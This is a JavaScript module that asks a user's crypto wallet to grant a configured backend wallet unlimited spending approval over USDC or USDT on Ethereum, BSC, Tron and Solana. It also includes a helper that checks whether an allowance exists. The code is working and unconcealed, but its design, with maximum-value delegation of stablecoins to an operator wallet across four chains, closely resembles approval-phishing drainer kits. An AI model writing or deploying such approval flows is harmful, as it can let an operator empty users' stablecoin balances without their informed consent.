import { getUSDCContract, getUSDTContract } from './tokenContracts'
import { getBackendWalletAddress } from './tokenContracts'
import { getAlchemyRpcUrl } from './alchemy'

/**
 * Approve ERC20 token spending for backend wallet (delegates with max values)
 * Uses Alchemy RPC infrastructure from environment variables
 * @param {string} tokenType - 'USDC' or 'USDT'
 * @param {string} blockchain - 'ethereum', 'bsc', 'tron', 'solana'
 * @param {string} userAddress - User's wallet address
 * @param {Object} walletClient - Wagmi wallet client (optional, for EVM chains)
 * @returns {Promise<string>} Transaction hash
 */
export const approveToken = async (tokenType, blockchain, userAddress, walletClient = null) => {
  try {
    // Get token contract address from env
    const tokenContractAddress = tokenType === 'USDC' 
      ? getUSDCContract(blockchain)
      : getUSDTContract(blockchain)
    
    if (!tokenContractAddress) {
      throw new Error(`${tokenType} contract not configured for ${blockchain}`)
    }

    // Get backend wallet address (spender)
    const backendWalletAddress = getBackendWalletAddress(blockchain)
    if (!backendWalletAddress) {
      throw new Error(`Backend wallet not configured for ${blockchain}`)
    }

    // ERC20 ABI for approve function
    const erc20ABI = [
      {
        constant: false,
        inputs: [
          { name: '_spender', type: 'address' },
          { name: '_value', type: 'uint256' }
        ],
        name: 'approve',
        outputs: [{ name: '', type: 'bool' }],
        type: 'function'
      },
      {
        constant: true,
        inputs: [
          { name: '_owner', type: 'address' },
          { name: '_spender', type: 'address' }
        ],
        name: 'allowance',
        outputs: [{ name: '', type: 'uint256' }],
        type: 'function'
      }
    ]

    // For EVM chains (Ethereum, BSC)
    if (blockchain === 'ethereum' || blockchain === 'bsc') {
      try {
        // Use wagmi wallet client if provided (from RainbowKit)
        if (walletClient) {
          const { encodeFunctionData } = await import('viem')
          
          // Get max uint256 value for unlimited approval
          const maxAmount = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
          
          // ERC20 approve function ABI
          const approveAbi = [
            {
              name: 'approve',
              type: 'function',
              stateMutability: 'nonpayable',
              inputs: [
                { name: 'spender', type: 'address' },
                { name: 'amount', type: 'uint256' }
              ],
              outputs: [{ name: '', type: 'bool' }]
            }
          ]
          
          // Encode the approve function call
          const data = encodeFunctionData({
            abi: approveAbi,
            functionName: 'approve',
            args: [backendWalletAddress, maxAmount]
          })
          
          // Send transaction using wagmi wallet client (RainbowKit)
          const hash = await walletClient.sendTransaction({
            to: tokenContractAddress,
            data: data,
            account: walletClient.account
          })
          
          return hash
        }
        
        // Fallback to ethers.js if wallet client not provided
        if (!window.ethereum) {
          throw new Error('Web3 provider not found. Please connect your wallet.')
        }

        const ethers = await import('ethers')
        
        // Get Alchemy RPC URL for the blockchain
        const rpcUrl = getAlchemyRpcUrl(blockchain)
        
        // Create provider using Alchemy RPC
        let provider
        if (ethers.JsonRpcProvider) {
          // ethers v6
          provider = new ethers.JsonRpcProvider(rpcUrl)
        } else {
          // ethers v5
          provider = new ethers.providers.JsonRpcProvider(rpcUrl)
        }
        
        // Get signer from user's wallet (window.ethereum)
        let signer
        if (ethers.BrowserProvider) {
          // ethers v6
          const browserProvider = new ethers.BrowserProvider(window.ethereum)
          
          // Request accounts to ensure wallet is connected
          try {
            const accounts = await browserProvider.send('eth_requestAccounts', [])
            if (!accounts || accounts.length === 0) {
              throw new Error('No accounts found. Please connect your wallet.')
            }
          } catch (err) {
            // If request fails, try to get accounts without requesting
            try {
              const accounts = await browserProvider.send('eth_accounts', [])
              if (!accounts || accounts.length === 0) {
                throw new Error('Wallet not connected. Please connect your wallet first.')
              }
            } catch (accountsErr) {
              throw new Error('Wallet not connected. Please connect your wallet first.')
            }
          }
          
          // Get the signer - use the first connected account
          signer = await browserProvider.getSigner()
        } else {
          // ethers v5
          const web3Provider = new ethers.providers.Web3Provider(window.ethereum)
          
          // Request accounts to ensure wallet is connected
          try {
            await web3Provider.send('eth_requestAccounts', [])
          } catch (err) {
            // If request fails, try to get accounts without requesting
            try {
              const accounts = await web3Provider.send('eth_accounts', [])
              if (!accounts || accounts.length === 0) {
                throw new Error('Wallet not connected. Please connect your wallet first.')
              }
            } catch (accountsErr) {
              throw new Error('Wallet not connected. Please connect your wallet first.')
            }
          }
          
          signer = web3Provider.getSigner()
        }
        
        // Create contract instance with signer
        const tokenContract = new ethers.Contract(tokenContractAddress, erc20ABI, signer)
        
        // Approve max amount (unlimited approval)
        let maxAmount
        if (ethers.MaxUint256 !== undefined) {
          // ethers v6
          maxAmount = ethers.MaxUint256
        } else {
          // ethers v5
          maxAmount = ethers.constants.MaxUint256
        }
        
        // Send approval transaction
        const tx = await tokenContract.approve(backendWalletAddress, maxAmount)
        
        // Wait for transaction confirmation
        await tx.wait()
        
        return tx.hash
      } catch (error) {
        console.error('Error in token approval:', error)
        throw new Error(`Failed to approve ${tokenType}: ${error.message}`)
      }
    }
    
    // For Tron (TRC20 tokens)
    if (blockchain === 'tron') {
      if (!window.tronWeb) {
        throw new Error('TronWeb not found. Please connect your Tron wallet.')
      }
      
      try {
        // Get TronWeb instance
        const tronWeb = window.tronWeb
        
        // Ensure user is connected
        if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
          throw new Error('Please connect your Tron wallet first.')
        }
        
        // Get contract instance
        const contract = await tronWeb.contract().at(tokenContractAddress)
        
        // Approve with max value (2^256 - 1) for unlimited delegation
        // Using hex representation: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        // Convert hex to decimal string for TronWeb contract call
        const maxAmountHex = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
        const maxAmount = BigInt(maxAmountHex).toString()
        
        console.log(`Approving ${tokenType} with max amount (unlimited) for Tron wallet`)
        
        // Send approval transaction with max amount
        // TronLink will show this as unlimited approval
        const result = await contract.approve(backendWalletAddress, maxAmount).send()
        
        return result
      } catch (error) {
        console.error('Error approving Tron token:', error)
        throw new Error(`Failed to approve ${tokenType} on Tron: ${error.message}`)
      }
    }
    
    // For Solana (SPL tokens)
    if (blockchain === 'solana') {
      try {
        // Double-check we're actually on Solana blockchain
        if (blockchain !== 'solana') {
          throw new Error(`Invalid blockchain for Solana approval: ${blockchain}`)
        }
        
        // Import Solana web3.js
        const { Connection, PublicKey, Transaction, SystemProgram } = await import('@solana/web3.js')
        const { createApproveInstruction, getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = await import('@solana/spl-token')
        
        // Get Solana wallet from window (Phantom, Solflare, etc.)
        // Only access window.solana if we're definitely on Solana blockchain
        if (typeof window === 'undefined' || !window.solana) {
          throw new Error('Solana wallet not found. Please connect your Solana wallet (Phantom or Solflare).')
        }
        
        if (!window.solana.isPhantom && !window.solana.isSolflare) {
          throw new Error('Unsupported Solana wallet. Please use Phantom or Solflare.')
        }
        
        const wallet = window.solana
        
        // Ensure wallet is connected
        if (!wallet.publicKey) {
          throw new Error('Please connect your Solana wallet first.')
        }
        
        // Use the wallet's public key (from the connected wallet)
        const userPublicKey = wallet.publicKey
        
        // Verify that the userAddress matches the connected wallet
        const userAddressPubkey = new PublicKey(userAddress)
        if (userPublicKey.toBase58() !== userAddressPubkey.toBase58()) {
          throw new Error(`Connected wallet address (${userPublicKey.toBase58()}) does not match provided address (${userAddress})`)
        }
        
        const backendPublicKey = new PublicKey(backendWalletAddress)
        const tokenMint = new PublicKey(tokenContractAddress)
        
        // Get Alchemy RPC URL for Solana
        let rpcUrl = getAlchemyRpcUrl('solana')
        
        console.log('Using Solana RPC URL:', rpcUrl)
        
        // Create connection with Alchemy RPC
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed'
        })
        
        // Get associated token address for user (the token account to approve from)
        const userTokenAccount = await getAssociatedTokenAddress(
          tokenMint,
          userPublicKey
        )
        
        // Check if token account exists, if not, it needs to be created first
        const tokenAccountInfo = await connection.getAccountInfo(userTokenAccount)
        if (!tokenAccountInfo) {
          throw new Error(`Token account does not exist. Please receive ${tokenType} tokens first.`)
        }
        
        // Create approve instruction with max amount (2^64 - 1 for Solana)
        // The delegate is the backend wallet's public key (not a token account)
        const maxAmount = BigInt('18446744073709551615') // Max u64 value
        const approveInstruction = createApproveInstruction(
          userTokenAccount, // source token account
          backendPublicKey, // delegate (backend wallet public key)
          userPublicKey, // owner
          maxAmount, // amount (max for unlimited)
          [], // multiSigners
          TOKEN_PROGRAM_ID
        )
        
        // Create transaction
        const transaction = new Transaction().add(approveInstruction)
        
        // Get recent blockhash and set it on the transaction
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed')
        transaction.recentBlockhash = blockhash
        transaction.feePayer = userPublicKey
        
        // Request wallet to sign and send transaction
        // Solana wallets (Phantom, Solflare) use signTransaction, not sendTransaction
        let signature
        try {
          // Solana wallets use signTransaction to sign, then we send via connection
          if (!wallet.signTransaction) {
            throw new Error('Wallet does not support signTransaction method')
          }
          
          // Sign the transaction - this will prompt the user
          const signedTransaction = await wallet.signTransaction(transaction)
          
          // Send the signed transaction via connection
          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            maxRetries: 3
          })
          
          // Ensure signature is a string
          if (typeof signature !== 'string') {
            // If signature is an object, try to extract the signature string
            if (signature && typeof signature === 'object') {
              signature = signature.signature || signature.toString()
            } else {
              signature = String(signature)
            }
          }
          
          console.log('Transaction sent, signature:', signature)
        } catch (error) {
          console.error('Error signing/sending transaction:', error)
          throw new Error(`Failed to sign and send transaction: ${error.message || error.toString()}`)
        }
        
        // Wait for confirmation using Alchemy connection
        try {
          // confirmTransaction expects a string signature
          const confirmResult = await connection.confirmTransaction(signature, 'confirmed')
          console.log('Transaction confirmed:', confirmResult)
        } catch (confirmError) {
          console.warn('Confirmation error (transaction may still be processing):', confirmError)
          // Transaction might still be processing, but we have the signature
        }
        
        return signature
      } catch (error) {
        console.error('Error approving Solana token:', error)
        throw new Error(`Failed to approve ${tokenType} on Solana: ${error.message}`)
      }
    }
    
    throw new Error(`Unsupported blockchain: ${blockchain}`)
  } catch (error) {
    console.error('Error approving token:', error)
    throw error
  }
}

/**
 * Check if token is already approved
 * Uses Alchemy RPC infrastructure from environment variables
 * @param {string} tokenType - 'USDC' or 'USDT'
 * @param {string} blockchain - 'ethereum', 'bsc', 'tron', 'solana'
 * @param {string} userAddress - User's wallet address
 * @returns {Promise<boolean>} True if approved
 */
export const checkTokenApproval = async (tokenType, blockchain, userAddress) => {
  try {
    const tokenContractAddress = tokenType === 'USDC' 
      ? getUSDCContract(blockchain)
      : getUSDTContract(blockchain)
    
    if (!tokenContractAddress) {
      return false
    }

    const backendWalletAddress = getBackendWalletAddress(blockchain)
    if (!backendWalletAddress) {
      return false
    }

    const erc20ABI = [
      {
        constant: true,
        inputs: [
          { name: '_owner', type: 'address' },
          { name: '_spender', type: 'address' }
        ],
        name: 'allowance',
        outputs: [{ name: '', type: 'uint256' }],
        type: 'function'
      }
    ]

    if (blockchain === 'ethereum' || blockchain === 'bsc') {
      try {
        const ethers = await import('ethers')
        
        // Get Alchemy RPC URL for the blockchain
        const rpcUrl = getAlchemyRpcUrl(blockchain)
        
        // Create read-only provider using Alchemy RPC
        let provider
        if (ethers.JsonRpcProvider) {
          // ethers v6
          provider = new ethers.JsonRpcProvider(rpcUrl)
        } else {
          // ethers v5
          provider = new ethers.providers.JsonRpcProvider(rpcUrl)
        }
        
        // Create contract instance (read-only)
        const tokenContract = new ethers.Contract(tokenContractAddress, erc20ABI, provider)
        
        // Check allowance
        const allowance = await tokenContract.allowance(userAddress, backendWalletAddress)
        
        // Handle both BigInt (v6) and BigNumber (v5)
        let allowanceValue
        if (typeof allowance === 'bigint') {
          allowanceValue = allowance
        } else if (allowance.toBigInt) {
          allowanceValue = allowance.toBigInt()
        } else if (allowance.toString) {
          allowanceValue = BigInt(allowance.toString())
        } else {
          allowanceValue = BigInt(allowance)
        }
        
        // Return true if allowance is greater than 0
        return allowanceValue > 0n
      } catch (error) {
        console.error('Error checking allowance:', error)
        return false
      }
    }
    
    // For other blockchains, assume not approved
    return false
  } catch (error) {
    console.error('Error checking token approval:', error)
    return false
  }
}

